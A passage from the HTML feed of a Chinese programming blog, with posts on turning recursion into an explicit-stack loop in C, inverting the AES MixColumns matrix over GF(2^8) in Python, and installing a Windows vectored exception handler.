class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>:<span class="comment">//travel_by_recursive(node-&gt;right);</span></span><br><span class="line">s.push(&#123; t.node-&gt;right, <span class="number">0</span>, <span class="number">0</span> ,<span class="number">0</span>&#125;);</span><br><span class="line">t.pc++;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">s.pop();<span class="comment">//函数返回.</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在迭代的写法中，我们直接用一个switch 来根据pc 执行不同的代码</p><h1 id="Example2-求二分查找数组中的最大值"><a href="#Example2-求二分查找数组中的最大值" class="headerlink" title="Example2: 求二分查找数组中的最大值"></a>Example2: 求二分查找数组中的最大值</h1><h2 id="递归的写法-1"><a href="#递归的写法-1" class="headerlink" title="递归的写法:"></a>递归的写法:</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">get_max_by_recursive</span><span class="params">(<span class="type">int</span>*arr, <span class="type">int</span> left, <span class="type">int</span> right)</span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (left == right || (right - left) == <span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> max(arr[left], arr[right]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> left_m = get_max_by_recursive(arr, left, (left + right) / <span class="number">2</span>);</span><br><span class="line"><span class="type">int</span> right_m = get_max_by_recursive(arr, (left + right) / <span class="number">2</span> + <span class="number">1</span>, right);</span><br><span class="line"><span class="keyword">return</span> max(left_m, right_m);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="非递归的写法"><a href="#非递归的写法" class="headerlink" title="非递归的写法:"></a>非递归的写法:</h2><p>定义一个ctx:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">BSMaxCtx</span>&#123;</span></span><br><span class="line"><span class="comment">//args:</span></span><br><span class="line"><span class="type">int</span>*arr;</span><br><span class="line"><span class="type">int</span> left, right;</span><br><span class="line"><span class="comment">//局部变量</span></span><br><span class="line"><span class="type">int</span> left_m, right_m;</span><br><span class="line"><span class="comment">//临时变量,保存某个函数调用时的返回值.</span></span><br><span class="line"><span class="type">int</span> return_val;</span><br><span class="line"><span class="comment">//控制下一行代码.</span></span><br><span class="line"><span class="type">int</span> pc;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>迭代写法:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">get_max_by_iterate</span><span class="params">(<span class="type">int</span>*arr, <span class="type">int</span> left, <span class="type">int</span> right)</span>&#123;</span><br><span class="line"><span class="type">int</span> max_val = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//二分查找最大值.</span></span><br><span class="line"><span class="built_in">stack</span>&lt;BSMaxCtx&gt;s;</span><br><span class="line"><span class="comment">//第一次调用</span></span><br><span class="line">s.push(&#123; arr, left, right, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span> &#125;);</span><br><span class="line"><span class="keyword">while</span> (!s.empty())&#123;</span><br><span class="line"><span class="keyword">auto</span>&amp; t = s.top();</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (t.pc)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0</span>:<span class="comment">//判断终止条件</span></span><br><span class="line"><span class="keyword">if</span> (t.left == t.right || (t.left + <span class="number">1</span>) == t.right)&#123;</span><br><span class="line"><span class="type">int</span> tmp = max(t.arr[t.left], t.arr[t.right]);</span><br><span class="line">s.pop();</span><br><span class="line"><span class="comment">//将返回值传给上一次调用.</span></span><br><span class="line"><span class="keyword">if</span> (s.empty())&#123;</span><br><span class="line">max_val = tmp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">s.top().return_val = tmp;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">t.pc++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line"><span class="comment">//call get_max_by_recursive(arr, left, (left + right) / 2);</span></span><br><span class="line">s.push(&#123; t.arr, t.left, (t.left + t.right) / <span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span> &#125;);</span><br><span class="line">t.pc++;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line"><span class="comment">//left_m = eax;</span></span><br><span class="line">t.left_m = t.return_val;</span><br><span class="line">t.pc++;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line"><span class="comment">//call get_max_by_recursive(arr, (left + right) / 2 + 1, right);</span></span><br><span class="line">s.push(&#123; t.arr, (t.left + t.right) / <span class="number">2</span> + <span class="number">1</span>, t.right, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span> &#125;);</span><br><span class="line">t.pc++;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line"><span class="comment">//right_m = eax;</span></span><br><span class="line">t.right_m = t.return_val;</span><br><span class="line">t.pc++;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line"><span class="comment">//return max(left_m, right_m);</span></span><br><span class="line"><span class="keyword">do</span>&#123;</span><br><span class="line"><span class="type">int</span> tmp = max(t.left_m, t.right_m);</span><br><span class="line">s.pop();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (s.empty())&#123;</span><br><span class="line">max_val = tmp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">s.top().return_val = tmp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="number">0</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> max_val;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;原理&quot;&gt;&lt;a href=&quot;#原理&quot; class=&quot;headerlink&quot; title=&quot;原理:&quot;&gt;&lt;/a&gt;原理:&lt;/h1&gt;&lt;p&gt;想到一种通用的解法，直接模拟x86下c语言程序栈结构去执行。&lt;/p&gt;
&lt;p&gt;先看一下x86下c语言函数的栈结构:&lt;/p&gt;
&lt;figure</summary>
      
    
    
    
    <category term="algorithm" scheme="https://h4ckf0rfun.github.io/categories/algorithm/"/>
    
    
  </entry>
  
  <entry>
    <title>AES列混合矩阵求逆</title>
    <link href="https://h4ckf0rfun.github.io/2022/10/09/AES%E5%88%97%E6%B7%B7%E5%90%88%E7%9F%A9%E9%98%B5%E6%B1%82%E9%80%86/"/>
    <id>https://h4ckf0rfun.github.io/2022/10/09/AES%E5%88%97%E6%B7%B7%E5%90%88%E7%9F%A9%E9%98%B5%E6%B1%82%E9%80%86/</id>
    <published>2022-10-09T15:32:31.000Z</published>
    <updated>2022-10-09T15:36:43.644Z</updated>
    
    <content type="html"><![CDATA[<h1 id="AES列混合-矩阵求逆"><a href="#AES列混合-矩阵求逆" class="headerlink" title="AES列混合 矩阵求逆"></a>AES列混合 矩阵求逆</h1><p>还是没太明白具体原理，瞎JB搞了下但是算出来了</p><p>GF(2^8) 的多项式，不太明白这个，貌似是 每个系数是 域中的一个元素 (0或者1)</p><p>多项式加法的话对应的系数进行定义在这个域上的加法操作就行，多项式乘法的话，展开相乘就行，最后相加的时候也是按照定义在域上的乘法</p><p>多项式除发:</p><p>写成对应的二进制数，然后按照小学学过的除法规则就能求出余数，(这里面不涉及减法…)</p><p>mod <em>0b100011011：</em></p><p>多项式相乘之后再mod 这个数，目的是将结果限制在 0-255内</p><p>重新定义了加法和乘法，然后按照新的规则就能求出逆矩阵了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">gf28_add</span>(<span class="params">a:<span class="built_in">int</span>,b:<span class="built_in">int</span></span>)-&gt;<span class="built_in">int</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xff</span> &amp; (a ^ b)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gf28_mul</span>(<span class="params">a:<span class="built_in">int</span>,b:<span class="built_in">int</span></span>)-&gt;<span class="built_in">int</span>:</span><br><span class="line">    result = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> b:</span><br><span class="line">        <span class="keyword">if</span> b&amp;<span class="number">1</span>:</span><br><span class="line">            result = a ^ result</span><br><span class="line">        a&lt;&lt;=<span class="number">1</span></span><br><span class="line">        b&gt;&gt;=<span class="number">1</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="comment">#没有大小之说,只要长度相同就能进行运算.(或者说大小就算用长度比较.)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mod_mul</span>(<span class="params">a:<span class="built_in">int</span>, b:<span class="built_in">int</span></span>)-&gt;<span class="built_in">int</span>:</span><br><span class="line">    p = gf28_mul(a,b)</span><br><span class="line">    <span class="comment">##求p mod 0b100011011</span></span><br><span class="line">    result = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        i = <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(<span class="built_in">bin</span>(i * <span class="number">0b100011011</span>)) &gt; <span class="built_in">len</span>(<span class="built_in">bin</span>(p)):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span> <span class="built_in">len</span>(<span class="built_in">bin</span>(i * <span class="number">0b100011011</span>)) &lt; <span class="built_in">len</span>(<span class="built_in">bin</span>(p)):</span><br><span class="line">            i&lt;&lt;=<span class="number">1</span></span><br><span class="line">        <span class="keyword">assert</span>(<span class="built_in">len</span>(<span class="built_in">bin</span>(i * <span class="number">0b100011011</span>)) == <span class="built_in">len</span>(<span class="built_in">bin</span>(p)))</span><br><span class="line">        p^= (i * <span class="number">0b100011011</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_reverse</span>(<span class="params">a:<span class="built_in">int</span></span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        <span class="keyword">if</span> mod_mul(i,a) == <span class="number">0x1</span>:</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">assert</span>(<span class="literal">False</span>)</span><br><span class="line"><span class="comment">##x 8 + x 4 + x 3 + x + 1</span></span><br><span class="line"><span class="comment">## 0b100011011</span></span><br><span class="line">_<span class="built_in">map</span> = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">matrix_mul</span>(<span class="params">m1,m2,size</span>):</span><br><span class="line">    result = [[<span class="literal">None</span> <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(size)] <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(size)]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(size):</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(size):</span><br><span class="line">            result[y][x] = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(size):</span><br><span class="line">                result[y][x] =gf28_add( result[y][x] ,mod_mul(m1[y][t] , m2[t][x]))</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="comment"># 确实是存在逆的 ..但是为什么呢??</span></span><br><span class="line"><span class="comment"># for i in range(1,256):</span></span><br><span class="line"><span class="comment">#     key = get_reverse(i)</span></span><br><span class="line"><span class="comment">#     print(key)</span></span><br><span class="line"><span class="comment">#     if _map.get(key) != None:</span></span><br><span class="line"><span class="comment">#        print(&quot;Error&quot;)</span></span><br><span class="line"><span class="comment">#        exit(0)</span></span><br><span class="line"><span class="comment">#     else:</span></span><br><span class="line"><span class="comment">#         _map[key] = True</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">矩阵:</span></span><br><span class="line"><span class="string">2 3 1 1</span></span><br><span class="line"><span class="string">1 2 3 1</span></span><br><span class="line"><span class="string">1 1 2 3</span></span><br><span class="line"><span class="string">3 1 1 2</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">A = [</span><br><span class="line">    [<span class="number">2</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>],</span><br><span class="line">    [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>],</span><br><span class="line">    [<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>],</span><br><span class="line">    [<span class="number">3</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>]</span><br><span class="line">]</span><br><span class="line"><span class="comment"># Ax = E,将A 化为行阶梯矩阵</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    <span class="comment">#求出主元的逆.</span></span><br><span class="line">    r = get_reverse(A[i][i])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span> - i):</span><br><span class="line">        <span class="comment"># a x = b,求出x</span></span><br><span class="line">        x = mod_mul(r , A[i + <span class="number">1</span> + j][i])</span><br><span class="line">        <span class="comment">#消去一个元之后新的一行</span></span><br><span class="line">        new_l = A[i + <span class="number">1</span> + j]</span><br><span class="line">        <span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">            new_l[t] = gf28_add(mod_mul(x,A[i][t]),A[i+<span class="number">1</span>+j][t])</span><br><span class="line"></span><br><span class="line"><span class="comment">##回代</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    r = get_reverse(A[<span class="number">3</span> - i][<span class="number">3</span> - i])</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span> - i):</span><br><span class="line">        <span class="comment"># ax = b,求出x = a^-1 * b</span></span><br><span class="line">        x = mod_mul(r,A[<span class="number">3</span> - i - <span class="number">1</span> - j][<span class="number">3</span> - i])</span><br><span class="line">        new_l = A[<span class="number">3</span> - i - <span class="number">1</span> - j]</span><br><span class="line">        <span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">            new_l[t] = gf28_add(mod_mul(x,A[<span class="number">3</span> - i][t]),A[<span class="number">3</span> - i - <span class="number">1</span>-j][t])</span><br><span class="line"></span><br><span class="line"><span class="comment">## 化为1..</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    r = get_reverse(A[i][i])</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        A[i][t] = mod_mul(r,A[i][t])</span><br><span class="line"></span><br><span class="line"><span class="comment">#################################</span></span><br></pre></td></tr></table></figure><p>瞎JB求出来了，是下面的这个矩阵:</p><p><img src="https://h4ckf0rfun.github.io/2022/10/09/AES%E5%88%97%E6%B7%B7%E5%90%88%E7%9F%A9%E9%98%B5%E6%B1%82%E9%80%86/Untitled.png" alt="Untitled"></p><p>但是还有很多不懂的地方，看来得好好学习离散数学的知识了</p><p>不懂的地方:</p><ol><li>为什么有逆?</li><li>为什么要写成多项式的形式</li></ol><p>等之后学会了再把好好写一篇。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;AES列混合-矩阵求逆&quot;&gt;&lt;a href=&quot;#AES列混合-矩阵求逆&quot; class=&quot;headerlink&quot; title=&quot;AES列混合 矩阵求逆&quot;&gt;&lt;/a&gt;AES列混合 矩阵求逆&lt;/h1&gt;&lt;p&gt;还是没太明白具体原理，瞎JB搞了下但是算出来了&lt;/p&gt;
&lt;p&gt;GF(</summary>
      
    
    
    
    <category term="algorithm" scheme="https://h4ckf0rfun.github.io/categories/algorithm/"/>
    
    
  </entry>
  
  <entry>
    <title>windows 异常(0) - 总览</title>
    <link href="https://h4ckf0rfun.github.io/2022/10/07/windows%E5%BC%82%E5%B8%B8-0/"/>
    <id>https://h4ckf0rfun.github.io/2022/10/07/windows%E5%BC%82%E5%B8%B8-0/</id>
    <published>2022-10-07T15:35:22.000Z</published>
    <updated>2022-10-07T15:36:48.632Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://h4ckf0rfun.github.io/2022/10/07/windows%E5%BC%82%E5%B8%B8-0/%25E6%2597%25A0%25E6%25A0%2587%25E9%25A2%2598.png" alt="无标题.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://h4ckf0rfun.github.io/2022/10/07/windows%E5%BC%82%E5%B8%B8-0/%25E6%2597%25A0%25E6%25A0%2587%25E9%25A2%2598.png&quot; alt=&quot;无标题</summary>
      
    
    
    
    <category term="逆向" scheme="https://h4ckf0rfun.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
  </entry>
  
  <entry>
    <title>c程序运行流程</title>
    <link href="https://h4ckf0rfun.github.io/2022/10/07/c%E7%A8%8B%E5%BA%8F%E8%BF%90%E8%A1%8C%E6%B5%81%E7%A8%8B/"/>
    <id>https://h4ckf0rfun.github.io/2022/10/07/c%E7%A8%8B%E5%BA%8F%E8%BF%90%E8%A1%8C%E6%B5%81%E7%A8%8B/</id>
    <published>2022-10-07T11:44:16.000Z</published>
    <updated>2022-10-07T11:45:52.713Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://h4ckf0rfun.github.io/2022/10/07/c%E7%A8%8B%E5%BA%8F%E8%BF%90%E8%A1%8C%E6%B5%81%E7%A8%8B/%E8%BF%90%E8%A1%8C%E6%B5%81%E7%A8%8B.png" alt="Untitled"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://h4ckf0rfun.github.io/2022/10/07/c%E7%A8%8B%E5%BA%8F%E8%BF%90%E8%A1%8C%E6%B5%81%E7%A8%8B/%E8%BF%90%E8%A1%8C%E6%B5%81%E7%</summary>
      
    
    
    
    <category term="C语言" scheme="https://h4ckf0rfun.github.io/categories/C%E8%AF%AD%E8%A8%80/"/>
    
    
  </entry>
  
  <entry>
    <title>windows 异常(1) - VEH</title>
    <link href="https://h4ckf0rfun.github.io/2022/10/06/windows%E5%BC%82%E5%B8%B8-1/"/>
    <id>https://h4ckf0rfun.github.io/2022/10/06/windows%E5%BC%82%E5%B8%B8-1/</id>
    <published>2022-10-05T16:46:12.000Z</published>
    <updated>2022-10-05T16:51:36.850Z</updated>
    
    <content type="html"><![CDATA[<h1 id="VEH-Vector-Exception-Handler"><a href="#VEH-Vector-Exception-Handler" class="headerlink" title="VEH: Vector Exception Handler"></a>VEH: Vector Exception Handler</h1><p>当异常产生时，从0环返回三环后先进入 KiUserExceptionDispatcher函数</p><p><img src="https://h4ckf0rfun.github.io/2022/10/06/windows%E5%BC%82%E5%B8%B8-1/Untitled.png" alt="Untitled"></p><p>之后进入RtlDispatchException，</p><p><img src="https://h4ckf0rfun.github.io/2022/10/06/windows%E5%BC%82%E5%B8%B8-1/Untitled%201.png" alt="Untitled"></p><ol><li>先在vector exception handler list 中搜索处理程序.</li><li>如果在 vector exception handler list 没有对应的处理程序，那么从 fs:[0] 开始遍历ExceptionList来搜索对应的异常处理程序</li></ol><p>当异常被异常处理程序处理之后，再次调用ZwContinue进入0环，等下一次恢复到3环时，从修正的eip处开始执行。</p><h1 id="安装VEH"><a href="#安装VEH" class="headerlink" title="安装VEH"></a>安装VEH</h1><p><strong><strong>AddVectoredExceptionHandler</strong></strong></p><h2 id="Syntax"><a href="#Syntax" class="headerlink" title="Syntax"></a><strong>Syntax</strong></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PVOID AddVectoredExceptionHandler(</span><br><span class="line">  ULONG                       First,</span><br><span class="line">  PVECTORED_EXCEPTION_HANDLER Handler</span><br><span class="line">);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Parameters"><a href="#Parameters" class="headerlink" title="Parameters"></a><strong>Parameters</strong></h2><p><code>First</code></p><p>The order in which the handler should be called. If the parameter is nonzero, the handler is the first handler to be called. If the parameter is zero, the handler is the last handler to be called.</p><p><code>Handler</code></p><p>A pointer to the handler to be called. For more information, see <a href="https://learn.microsoft.com/en-us/windows/desktop/api/winnt/nc-winnt-pvectored_exception_handler">VectoredHandler</a>.</p><h2 id="Return-value"><a href="#Return-value" class="headerlink" title="Return value"></a><strong>Return value</strong></h2><p>If the function succeeds, the return value is a handle to the exception handler.</p><p>If the function fails, the return value is <strong>NULL</strong>.</p><h2 id="Example"><a href="#Example" class="headerlink" title="Example:"></a><strong>Example:</strong></h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">LONG __stdcall <span class="title function_">vectoredExceptionHandler</span><span class="params">(</span></span><br><span class="line"><span class="params"> _EXCEPTION_POINTERS *ExceptionInfo</span></span><br><span class="line"><span class="params">)</span>&#123;</span><br><span class="line"><span class="comment">//EXCEPTION_XXXXXX</span></span><br><span class="line"><span class="keyword">if</span> (ExceptionInfo-&gt;ExceptionRecord-&gt;ExceptionCode == EXCEPTION_INT_DIVIDE_BY_ZERO)&#123;</span><br><span class="line">MessageBox(<span class="literal">NULL</span>, <span class="string">L&quot;Div by zero&quot;</span>, <span class="string">L&quot;Error&quot;</span>, MB_OK);</span><br><span class="line">ExceptionInfo-&gt;ContextRecord-&gt;Eip += <span class="number">2</span>;</span><br><span class="line"><span class="keyword">return</span> EXCEPTION_CONTINUE_EXECUTION;<span class="comment">//继续执行代码</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> EXCEPTION_CONTINUE_SEARCH;<span class="comment">//不是我们感兴趣的Exception Code,让它继续沿着链表去寻找处理程序</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="literal">NULL</span> == AddVectoredExceptionHandler(<span class="number">0</span>, vectoredExceptionHandler))&#123;</span><br><span class="line">perror(<span class="string">&quot;Add Vector Exception Handler Failed!&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line">__asm&#123;</span><br><span class="line">xor eax, eax;</span><br><span class="line">div eax;              <span class="comment">//触发异常.</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Hello World\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;VEH-Vector-Exception-Handler&quot;&gt;&lt;a href=&quot;#VEH-Vector-Exception-Handler&quot; class=&quot;headerlink&quot; title=&quot;VEH: Vector Exception Handler&quot;&gt;&lt;/a&gt;V</summary>
      
    
    
    
    <category term="逆向" scheme="https://h4ckf0rfun.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
  </entry>
  
